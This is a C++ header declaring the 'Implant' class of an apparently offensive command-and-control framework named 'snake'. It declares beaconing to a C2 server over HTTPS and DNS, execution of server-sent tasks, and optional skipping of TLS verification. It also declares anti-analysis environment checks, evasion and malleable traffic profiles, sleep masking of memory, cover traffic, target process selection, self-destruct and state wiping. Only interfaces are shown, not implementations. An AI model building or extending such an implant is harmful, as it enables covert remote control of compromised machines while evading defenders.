#pragma once

#include <cstdint>
#include <functional>
#include <map>
#include <string>
#include <vector>

#include "snake/antianalysis.hpp"
#include "snake/crypto.hpp"
#include "snake/evade.hpp"
#include "snake/lifetime.hpp"
#include "snake/malleable.hpp"
#include "snake/net.hpp"
#include "snake/protocol.hpp"
#include "snake/schedule.hpp"
#include "snake/sleepmask.hpp"

namespace snake {

struct ImplantConfig {
    std::string c2_url;
    std::string fingerprint;
    std::string ca_file;
    bool skip_tls_verify = false;
    Bytes session_key;
    std::string dns_domain;
    std::string channel = "auto";
    std::string dns_resolver;
    int beacon_min = 60;
    int beacon_max = 300;
    bool debug = false;
    bool once = false;
    std::string forced_id;
    LifetimePolicy lifetime;
    SchedulePolicy schedule;
    AnalysisPolicy analysis;
    evade::EvadePolicy evade;
    malleable::Profile profile;
};

class Implant {
  public:
    explicit Implant(ImplantConfig cfg);
    int run();

    const std::string& id() const { return id_; }

  private:
    bool beacon_primary();
    bool beacon_rest();
    bool beacon_dns();
    protocol::TaskResult execute_task(const protocol::Task& task);
    std::string lifetime_expiry() const;
    bool schedule_allows_now() const;
    std::vector<MaskRegion> sensitive_regions();
    void masked_sleep(long long seconds, const std::function<bool()>& tick);
    void self_destruct(const std::string& reason);
    void wipe_state();
    bool environment_check();
    AnalysisReadings gather_readings();
    net::HeaderList profile_headers(bool json) const;
    malleable::TemplateVars template_vars() const;
    bool expand_endpoint(const std::string& tmpl, std::string& out);
    void send_cover_traffic(const std::string& host, uint16_t port, const net::TlsOptions& opts);
    std::string target_proc();
    void log(const std::string& msg);
    void debug_log(const std::string& msg);

    ImplantConfig cfg_;
    std::string id_;
    std::string hostname_;
    bool stop_ = false;
    long long start_time_ = 0;
    bool lifetime_tripped_ = false;
    SleepMask mask_;
    Bytes inflight_;
};

std::string implant_os_name();
std::string implant_arch_name();

}  // namespace snake
